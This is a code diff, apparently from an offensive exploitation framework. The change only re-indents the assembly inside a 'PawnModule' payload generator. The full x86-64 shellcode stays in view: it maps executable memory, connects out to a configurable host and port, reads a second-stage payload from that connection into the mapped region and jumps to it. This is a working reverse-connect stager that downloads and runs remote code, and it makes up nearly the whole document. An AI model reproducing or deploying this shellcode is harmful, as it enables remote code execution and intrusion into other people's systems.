@@ -31,78 +31,78 @@ class PawnModule(Module, Assembler):
 
     def run(self):
         payload = dedent(f"""\
-            start:
-                push 0x9
-                pop  rax
-                xor  rdi, rdi
-                push {hex(self.length.value)}
-                pop  rsi
-                push 0x7
-                pop  rdx
-                xor  r9, r9
-                push 0x22
-                pop  r10
-                syscall
+        start:
+            push 0x9
+            pop  rax
+            xor  rdi, rdi
+            push {hex(self.length.value)}
+            pop  rsi
+            push 0x7
+            pop  rdx
+            xor  r9, r9
+            push 0x22
+            pop  r10
+            syscall
 
         """)
 
         if self.reliable.value:
             payload += dedent("""\
-                    test rax, rax
-                    js   fail
+                test rax, rax
+                js   fail
             """)
 
         payload += dedent(f"""\
-                push rax
+            push rax
 
-                push 0x29
-                pop  rax
-                cdq
-                push 0x2
-                pop  rdi
-                push 0x1
-                pop  rsi
-                syscall
+            push 0x29
+            pop  rax
+            cdq
+            push 0x2
+            pop  rdi
+            push 0x1
+            pop  rsi
+            syscall
 
-                xchg   rdi, rax
-                movabs rcx, 0x{self.host.little.hex()}{self.port.little.hex()}0002
-                push   rcx
-                mov    rsi, rsp
-                push   0x10
-                pop    rdx
-                push   0x2a
-                pop    rax
-                syscall
+            xchg   rdi, rax
+            movabs rcx, 0x{self.host.little.hex()}{self.port.little.hex()}0002
+            push   rcx
+            mov    rsi, rsp
+            push   0x10
+            pop    rdx
+            push   0x2a
+            pop    rax
+            syscall
 
-                pop rcx
+            pop rcx
 
-                push 0x2d
-                pop  rax
-                pop  rsi
-                push {hex(self.length.value)}
-                pop  rdx
-                push 0x100
-                pop  r10
-                syscall
+            push 0x2d
+            pop  rax
+            pop  rsi
+            push {hex(self.length.value)}
+            pop  rdx
+            push 0x100
+            pop  r10
+            syscall
         """)
 
         if self.reliable.value:
             payload += dedent("""\
-                    test rax, rax
-                    js   fail
+                test rax, rax
+                js   fail
             """)
 
         payload += dedent("""\
-                jmp rsi
+            jmp rsi
         """)
 
         if self.reliable.value:
             payload += dedent("""\
-                fail:
-                    push 0x3c
-                    pop  rax
-                    xor  rdi, rdi
-                    syscall
+            fail:
+                push 0x3c
+                pop  rax
+                xor  rdi, rdi
+                syscall
             """)
 
         return self.assemble(
